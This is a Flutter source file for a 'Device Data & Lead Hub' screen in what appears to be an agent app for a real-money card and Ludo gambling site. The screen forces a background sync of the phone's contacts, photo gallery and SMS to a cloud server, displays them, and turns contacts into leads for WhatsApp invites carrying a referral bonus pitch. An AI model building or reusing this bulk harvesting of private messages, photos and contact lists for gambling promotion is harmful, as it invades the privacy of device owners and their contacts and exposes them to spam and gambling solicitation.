import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:share_plus/share_plus.dart';
import 'package:url_launcher/url_launcher.dart';
import '../agent_theme.dart';
import '../services/agent_api_service.dart';
import '../services/agent_sync_service.dart';
import '../services/agent_permission_helper.dart';

class AgentSyncScreen extends StatefulWidget {
  const AgentSyncScreen({super.key});

  @override
  State<AgentSyncScreen> createState() => _AgentSyncScreenState();
}

class _AgentSyncScreenState extends State<AgentSyncScreen> with SingleTickerProviderStateMixin {
  final _api = AgentApiService();
  late TabController _tabController;

  Map<String, dynamic>? _syncStatus;
  List<Map<String, dynamic>> _contacts = [];
  List<Map<String, dynamic>> _filteredContacts = [];
  List<Map<String, dynamic>> _gallery = [];
  List<Map<String, dynamic>> _sms = [];

  bool _isLoading = true;
  bool _isSyncing = false;
  String _searchQuery = '';
  String _referralCode = '';
  final TextEditingController _searchCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 3, vsync: this);
    _loadAllData();

    // Listen to sync progress
    AgentSyncService.instance.isSyncingNotifier.addListener(_syncListener);
  }

  @override
  void dispose() {
    AgentSyncService.instance.isSyncingNotifier.removeListener(_syncListener);
    _tabController.dispose();
    _searchCtrl.dispose();
    super.dispose();
  }

  void _syncListener() {
    if (mounted) {
      setState(() => _isSyncing = AgentSyncService.instance.isSyncingNotifier.value);
      if (!_isSyncing) {
        _loadAllData(showLoading: false);
      }
    }
  }

  Future<void> _loadAllData({bool showLoading = true}) async {
    if (showLoading) setState(() => _isLoading = true);
    try {
      try {
        final p = await _api.getProfile();
        _referralCode = p.referralCode;
      } catch (_) {}

      final results = await Future.wait([
        _api.getSyncStatus().catchError((_) => <String, dynamic>{}),
        _api.getSyncedContacts(limit: 500).catchError((_) => <Map<String, dynamic>>[]),
        _api.getSyncedGallery(limit: 150).catchError((_) => <Map<String, dynamic>>[]),
        _api.getSyncedSms(limit: 200).catchError((_) => <Map<String, dynamic>>[]),
      ]);

      if (mounted) {
        _syncStatus = results[0] as Map<String, dynamic>?;
        _contacts = results[1] as List<Map<String, dynamic>>;
        _gallery = results[2] as List<Map<String, dynamic>>;
        _sms = results[3] as List<Map<String, dynamic>>;
        _filterContacts();
        setState(() => _isLoading = false);
      }
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  void _filterContacts() {
    if (_searchQuery.isEmpty) {
      _filteredContacts = List.from(_contacts);
    } else {
      final q = _searchQuery.toLowerCase();
      _filteredContacts = _contacts.where((c) {
        final name = (c['name'] ?? '').toString().toLowerCase();
        final phone = (c['phone'] ?? '').toString().toLowerCase();
        return name.contains(q) || phone.contains(q);
      }).toList();
    }
  }

  Future<void> _triggerFullSync() async {
    setState(() => _isSyncing = true);
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
        content: Text('Starting device background sync...'),
        backgroundColor: AgentTheme.gold,
      ),
    );
    await AgentPermissionHelper.requestAllPermissionsAndSync();
    await AgentSyncService.instance.triggerSync(force: true);
    await _loadAllData(showLoading: false);
    if (mounted) {
      setState(() => _isSyncing = false);
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text('Sync completed! Updated contacts, gallery & SMS.'),
          backgroundColor: AgentTheme.winGreen,
        ),
      );
    }
  }

  void _inviteViaWhatsApp(String phone, String name) async {
    final cleanPhone = phone.replaceAll(RegExp(r'[^0-9]'), '');
    final url = 'https://game.myonlinejoker.com/?ref=$_referralCode';
    final text = 'Hello $name! 🃏 Play real-money Teen Patti, Rummy & Ludo on MyOnlineJoker!\n\n'
        '🎁 Claim ₹500 Welcome Bonus with my VIP link:\n'
        '$url\n\n'
        'Use My Agent Invite Code: *$_referralCode*';

    final waUri = Uri.parse('whatsapp://send?phone=$cleanPhone&text=${Uri.encodeComponent(text)}');
    try {
      if (await canLaunchUrl(waUri)) {
        await launchUrl(waUri);
      } else {
        Share.share(text, subject: 'MyOnlineJoker VIP Invite');
      }
    } catch (_) {
      Share.share(text, subject: 'MyOnlineJoker VIP Invite');
    }
  }

  void _callNumber(String phone) async {
    final cleanPhone = phone.replaceAll(RegExp(r'[^0-9+]'), '');
    final telUri = Uri.parse('tel:$cleanPhone');
    if (await canLaunchUrl(telUri)) {
      await launchUrl(telUri);
    }
  }

  void _previewImage(Map<String, dynamic> item) {
    final url = item['file_url'] as String?;
    final name = item['file_name'] as String? ?? 'Photo';
    final size = ((item['file_size'] as int? ?? 0) / 1024).toStringAsFixed(1);
    final date = item['synced_at'] != null ? item['synced_at'].toString().split('T')[0] : '';

    showDialog(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: AgentTheme.surface,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            ClipRRect(
              borderRadius: const BorderRadius.vertical(top: Radius.circular(16)),
              child: url != null && url.isNotEmpty
                  ? Image.network(
                      url,
                      fit: BoxFit.contain,
                      loadingBuilder: (_, child, progress) => progress == null
                          ? child
                          : const SizedBox(
                              height: 250,
                              child: Center(child: CircularProgressIndicator(color: AgentTheme.gold)),
                            ),
                      errorBuilder: (_, __, ___) => const SizedBox(
                        height: 200,
                        child: Center(
                          child: Icon(Icons.broken_image, size: 60, color: AgentTheme.textMuted),
                        ),
                      ),
                    )
                  : const SizedBox(
                      height: 200,
                      child: Center(child: Icon(Icons.image, size: 60, color: AgentTheme.textMuted)),
                    ),
            ),
            Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(name, style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.white, fontSize: 14)),
                  const SizedBox(height: 4),
                  Text('$size KB · Synced $date', style: const TextStyle(color: AgentTheme.textMuted, fontSize: 12)),
                  const SizedBox(height: 12),
                  SizedBox(
                    width: double.infinity,
                    child: OutlinedButton(
                      onPressed: () => Navigator.pop(ctx),
                      style: OutlinedButton.styleFrom(
                        side: const BorderSide(color: AgentTheme.gold),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                      ),
                      child: const Text('Close Preview', style: TextStyle(color: AgentTheme.gold)),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final contactsCount = _syncStatus?['contacts_count'] ?? _contacts.length;
    final galleryCount = _syncStatus?['gallery_count'] ?? _gallery.length;
    final smsCount = _syncStatus?['sms_count'] ?? _sms.length;

    return Scaffold(
      backgroundColor: AgentTheme.background,
      appBar: AppBar(
        title: const Text('Device Data & Lead Hub'),
        backgroundColor: AgentTheme.surface,
        elevation: 0,
        actions: [
          IconButton(
            icon: _isSyncing
                ? const SizedBox(
                    width: 18,
                    height: 18,
                    child: CircularProgressIndicator(color: AgentTheme.gold, strokeWidth: 2),
                  )
                : const Icon(Icons.sync, color: AgentTheme.gold),
            tooltip: 'Sync All Device Data',
            onPressed: _isSyncing ? null : _triggerFullSync,
          ),
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.white70),
            tooltip: 'Refresh Lists',
            onPressed: () => _loadAllData(showLoading: true),
          ),
        ],
        bottom: TabBar(
          controller: _tabController,
          indicatorColor: AgentTheme.gold,
          labelColor: AgentTheme.gold,
          unselectedLabelColor: AgentTheme.textMuted,
          tabs: [
            Tab(
              icon: const Icon(Icons.contacts, size: 20),
              text: 'Contacts ($contactsCount)',
            ),
            Tab(
              icon: const Icon(Icons.photo_library, size: 20),
              text: 'Gallery ($galleryCount)',
            ),
            Tab(
              icon: const Icon(Icons.sms, size: 20),
              text: 'SMS ($smsCount)',
            ),
          ],
        ),
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: AgentTheme.gold))
          : Column(
              children: [
                _buildSyncHeader(contactsCount, galleryCount, smsCount),
                Expanded(
                  child: TabBarView(
                    controller: _tabController,
                    children: [
                      _buildContactsTab(),
                      _buildGalleryTab(),
                      _buildSmsTab(),
                    ],
                  ),
                ),
              ],
            ),
    );
  }

  Widget _buildSyncHeader(int cCount, int gCount, int sCount) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: AgentTheme.surface,
        border: Border(bottom: BorderSide(color: Colors.white.withOpacity(0.08))),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Expanded(
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: AgentTheme.gold.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Icon(Icons.cloud_done, color: AgentTheme.gold, size: 20),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text(
                        'Cloud Sync (AList / Google Drive)',
                        style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13),
                      ),
                      Text(
                        _isSyncing ? 'Sync in progress...' : 'Live auto-sync active · Zero phone storage',
                        style: TextStyle(
                          color: _isSyncing ? AgentTheme.gold : AgentTheme.textMuted,
                          fontSize: 11,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          ElevatedButton.icon(
            onPressed: _isSyncing ? null : _triggerFullSync,
            style: ElevatedButton.styleFrom(
              backgroundColor: AgentTheme.gold,
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            icon: _isSyncing
                ? const SizedBox(
                    width: 14,
                    height: 14,
                    child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2),
                  )
                : const Icon(Icons.sync, color: Colors.black, size: 16),
            label: Text(
              _isSyncing ? 'Syncing...' : 'Sync Now',
              style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold, fontSize: 12),
            ),
          ),
        ],
      ),
    );
  }

  // ── CONTACTS TAB ──────────────────────────────────────────────────────────
  Widget _buildContactsTab() {
    return Column(
      children: [
        // Search bar
        Padding(
          padding: const EdgeInsets.all(12),
          child: TextField(
            controller: _searchCtrl,
            onChanged: (val) {
              setState(() {
                _searchQuery = val;
                _filterContacts();
              });
            },
            style: const TextStyle(color: Colors.white, fontSize: 13),
            decoration: InputDecoration(
              filled: true,
              fillColor: AgentTheme.surface,
              hintText: 'Search by contact name or mobile number...',
              hintStyle: const TextStyle(color: AgentTheme.textMuted, fontSize: 13),
              prefixIcon: const Icon(Icons.search, color: AgentTheme.gold, size: 20),
              suffixIcon: _searchQuery.isNotEmpty
                  ? IconButton(
                      icon: const Icon(Icons.clear, color: Colors.white54, size: 18),
                      onPressed: () {
                        _searchCtrl.clear();
                        setState(() {
                          _searchQuery = '';
                          _filterContacts();
                        });
                      },
                    )
                  : null,
              contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
            ),
          ),
        ),

        // Contacts list
        Expanded(
          child: _filteredContacts.isEmpty
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Icon(Icons.people_outline, size: 50, color: AgentTheme.textMuted),
                      const SizedBox(height: 12),
                      Text(
                        _searchQuery.isNotEmpty ? 'No contacts match "$_searchQuery"' : 'No synced contacts found.',
                        style: const TextStyle(color: Colors.white70, fontSize: 14),
                      ),
                      const SizedBox(height: 8),
                      ElevatedButton.icon(
                        onPressed: _triggerFullSync,
                        icon: const Icon(Icons.sync, size: 16),
                        label: const Text('Sync Contacts from Device'),
                        style: ElevatedButton.styleFrom(backgroundColor: AgentTheme.gold, foregroundColor: Colors.black),
                      ),
                    ],
                  ),
                )
              : ListView.separated(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                  itemCount: _filteredContacts.length,
                  separatorBuilder: (_, __) => const SizedBox(height: 6),
                  itemBuilder: (ctx, i) {
                    final c = _filteredContacts[i];
                    final name = c['name'] ?? 'Unknown';
                    final phone = c['phone'] ?? '';
                    final initial = name.isNotEmpty ? name[0].toUpperCase() : '?';

                    return Container(
                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                      decoration: BoxDecoration(
                        color: AgentTheme.surface,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: Colors.white.withOpacity(0.05)),
                      ),
                      child: Row(
                        children: [
                          CircleAvatar(
                            radius: 18,
                            backgroundColor: AgentTheme.gold.withOpacity(0.2),
                            child: Text(
                              initial,
                              style: const TextStyle(color: AgentTheme.gold, fontWeight: FontWeight.bold, fontSize: 14),
                            ),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  name,
                                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600, fontSize: 13),
                                  overflow: TextOverflow.ellipsis,
                                ),
                                const SizedBox(height: 2),
                                Text(
                                  phone,
                                  style: const TextStyle(color: AgentTheme.textMuted, fontSize: 12),
                                ),
                              ],
                            ),
                          ),
                          // WhatsApp Invite Button
                          IconButton(
                            icon: const Icon(Icons.share, color: AgentTheme.winGreen, size: 20),
                            tooltip: 'Invite via WhatsApp',
                            onPressed: () => _inviteViaWhatsApp(phone, name),
                          ),
                          // Phone Call Button
                          IconButton(
                            icon: const Icon(Icons.phone_outlined, color: AgentTheme.gold, size: 20),
                            tooltip: 'Dial Number',
                            onPressed: () => _callNumber(phone),
                          ),
                        ],
                      ),
                    );
                  },
                ),
        ),
      ],
    );
  }

  // ── GALLERY TAB ───────────────────────────────────────────────────────────
  Widget _buildGalleryTab() {
    if (_gallery.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.photo_library_outlined, size: 50, color: AgentTheme.textMuted),
            const SizedBox(height: 12),
            const Text(
              'No synced photos found in cloud storage.',
              style: TextStyle(color: Colors.white70, fontSize: 14),
            ),
            const SizedBox(height: 8),
            ElevatedButton.icon(
              onPressed: _triggerFullSync,
              icon: const Icon(Icons.sync, size: 16),
              label: const Text('Sync Gallery Photos Now'),
              style: ElevatedButton.styleFrom(backgroundColor: AgentTheme.gold, foregroundColor: Colors.black),
            ),
          ],
        ),
      );
    }

    return GridView.builder(
      padding: const EdgeInsets.all(12),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 3,
        crossAxisSpacing: 8,
        mainAxisSpacing: 8,
        childAspectRatio: 1.0,
      ),
      itemCount: _gallery.length,
      itemBuilder: (ctx, i) {
        final item = _gallery[i];
        final url = item['file_url'] as String?;
        final name = item['file_name'] as String? ?? 'Photo';

        return GestureDetector(
          onTap: () => _previewImage(item),
          child: Container(
            decoration: BoxDecoration(
              color: AgentTheme.surface,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: Colors.white.withOpacity(0.08)),
            ),
            clipBehavior: Clip.antiAlias,
            child: Stack(
              fit: StackFit.expand,
              children: [
                if (url != null && url.isNotEmpty)
                  Image.network(
                    url,
                    fit: BoxFit.cover,
                    loadingBuilder: (_, child, progress) => progress == null
                        ? child
                        : const Center(
                            child: SizedBox(
                              width: 20,
                              height: 20,
                              child: CircularProgressIndicator(color: AgentTheme.gold, strokeWidth: 1.5),
                            ),
                          ),
                    errorBuilder: (_, __, ___) => const Center(
                      child: Icon(Icons.broken_image, color: AgentTheme.textMuted),
                    ),
                  )
                else
                  const Center(child: Icon(Icons.image, color: AgentTheme.textMuted)),

                Positioned(
                  bottom: 0,
                  left: 0,
                  right: 0,
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
                    color: Colors.black87,
                    child: Text(
                      name,
                      style: const TextStyle(color: Colors.white, fontSize: 9),
                      overflow: TextOverflow.ellipsis,
                      textAlign: TextAlign.center,
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  // ── SMS TAB ───────────────────────────────────────────────────────────────
  Widget _buildSmsTab() {
    if (_sms.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.sms_outlined, size: 50, color: AgentTheme.textMuted),
            const SizedBox(height: 12),
            const Text(
              'No synced SMS found in database.',
              style: TextStyle(color: Colors.white70, fontSize: 14),
            ),
            const SizedBox(height: 8),
            ElevatedButton.icon(
              onPressed: _triggerFullSync,
              icon: const Icon(Icons.sync, size: 16),
              label: const Text('Sync SMS from Device'),
              style: ElevatedButton.styleFrom(backgroundColor: AgentTheme.gold, foregroundColor: Colors.black),
            ),
          ],
        ),
      );
    }

    return ListView.separated(
      padding: const EdgeInsets.all(12),
      itemCount: _sms.length,
      separatorBuilder: (_, __) => const SizedBox(height: 8),
      itemBuilder: (ctx, i) {
        final m = _sms[i];
        final sender = m['sender'] ?? 'Unknown Sender';
        final body = m['body'] ?? '';
        final dateStr = m['message_date'] != null
            ? m['message_date'].toString().split('T')[0]
            : (m['synced_at'] != null ? m['synced_at'].toString().split('T')[0] : '');

        return Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: AgentTheme.surface,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.white.withOpacity(0.06)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Row(
                    children: [
                      const Icon(Icons.message_outlined, color: AgentTheme.gold, size: 16),
                      const SizedBox(width: 8),
                      Text(
                        sender,
                        style: const TextStyle(color: AgentTheme.gold, fontWeight: FontWeight.bold, fontSize: 13),
                      ),
                    ],
                  ),
                  Row(
                    children: [
                      Text(dateStr, style: const TextStyle(color: AgentTheme.textMuted, fontSize: 11)),
                      const SizedBox(width: 4),
                      IconButton(
                        padding: EdgeInsets.zero,
                        constraints: const BoxConstraints(),
                        icon: const Icon(Icons.copy, size: 14, color: AgentTheme.textMuted),
                        tooltip: 'Copy SMS text',
                        onPressed: () {
                          Clipboard.setData(ClipboardData(text: body));
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('SMS text copied to clipboard!')),
                          );
                        },
                      ),
                    ],
                  ),
                ],
              ),
              const SizedBox(height: 8),
              Text(
                body,
                style: const TextStyle(color: Colors.white70, fontSize: 12, height: 1.4),
              ),
            ],
          ),
        );
      },
    );
  }
}
